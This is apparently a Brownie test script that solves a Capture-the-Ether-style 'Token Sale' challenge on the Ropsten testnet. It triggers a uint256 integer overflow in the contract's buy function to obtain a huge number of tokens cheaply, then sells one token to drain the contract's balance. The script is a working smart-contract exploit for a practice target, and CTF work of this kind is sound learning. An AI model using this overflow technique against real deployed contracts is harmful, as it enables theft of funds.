from brownie import accounts, TokenSaleChallenge
from web3 import Web3

# --------------------------------------------------------
# To complete this challenge we must make the balance of
# the contract less than 1 ether
#
# we can do this causing an integer overflow
# --------------------------------------------------------

MAX_VAL = 2 ** 256
eth_to_wei = Web3.toWei("1", "ether")
num_tokens = (MAX_VAL // eth_to_wei) + 1
eth_amount = (num_tokens * eth_to_wei) % MAX_VAL
challenge_address = "0x085c9D279F942834a62C7c953e03999Cb0F0FF26"


def test_token_sale():
    # load account
    account = accounts.load("Ropsten_test_net_account")

    # get challenge contract
    challenge = TokenSaleChallenge.at(challenge_address)

    # call buy and cause integer overflow to obatin large amountn of tokens
    tx = challenge.buy(num_tokens, {"from": account, "value": eth_amount})
    tx.wait(1)

    print(f"The balance of our contract: {challenge.balanceOf(account.address)}")

    # sell 1 token
    tx = challenge.sell(1, {"from": account})
    tx.wait(1)

    print(f"The balance of the contract: {challenge.balance()}")

    # confirm the level is completed
    assert challenge.isComplete()
